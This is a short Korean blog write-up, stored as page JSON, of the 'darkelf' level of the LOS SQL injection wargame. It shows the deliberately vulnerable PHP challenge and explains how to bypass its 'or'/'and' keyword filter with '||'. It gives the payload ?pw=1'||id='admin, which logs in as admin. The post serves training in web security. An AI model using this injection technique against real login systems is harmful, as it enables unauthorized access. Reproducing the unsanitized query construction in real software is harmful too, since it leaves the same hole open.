{"pageProps":{"post":{"slug":"2017-08-13-LOS-darkelf","content":"\n![](/assets/posts/los/darkelf.png)\n\n`query : select id from prob_darkelf where id='guest' and pw=''`\n\n```php\n<?php \n  include \"./config.php\"; \n  login_chk(); \n  dbconnect();  \n  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\"); \n  if(preg_match('/or|and/i', $_GET[pw])) exit(\"HeHe\"); \n  $query = \"select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'\"; \n  echo \"<hr>query : <strong>{$query}</strong><hr><br>\"; \n  $result = @mysql_fetch_array(mysql_query($query)); \n  if($result['id']) echo \"<h2>Hello {$result[id]}</h2>\"; \n  if($result['id'] == 'admin') solve(\"darkelf\"); \n  highlight_file(__FILE__); \n?>\n```\n\ndarkelf 문제는 지금까지의 문제를 잘 풀어냈다면 한 번에 풀 수 있다.\n지금까지는 ?pw=1' or id='admin 이런 식으로 풀어지만 이 문제에서는 or와 and가 필터링 되어있다.\n그렇다면 or와 and를 대신 할 무언가가 있어야 한다.\n\nor = ||\nand = && 으로 대체해주자.\n\n`?pw=1'||id='admin`\n\n![](/assets/posts/los/darkelf_clear.png)\n\n","layout":"post","title":"[LOS] darkelf","categories":["LOS"],"excerpt":" ","comments":true,"share":true,"tags":["LOS","Web-hacking","darkelf","write-up"]}},"__N_SSG":true}